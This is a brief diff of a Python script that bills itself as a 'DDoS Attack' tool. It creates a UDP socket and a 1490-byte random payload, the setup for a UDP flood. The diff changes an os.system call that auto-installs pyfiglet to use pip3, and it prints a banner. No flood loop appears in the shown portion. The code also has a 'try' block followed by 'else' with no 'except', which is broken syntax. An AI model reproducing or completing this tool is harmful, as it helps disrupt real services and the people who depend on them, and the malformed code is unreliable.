@@ -9,14 +9,13 @@ from datetime import datetime
 try: # not native
   from pyfiglet import Figlet
 else:
-    os.system('pip install pyfiglet==0.7')
+    os.system('pip3 install pyfiglet==0.7')
     from pyfiglet import Figlet
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 os.system("cls")
-
 f = Figlet(font='slant')
 print (f.renderText('DDoS Attack'))
 
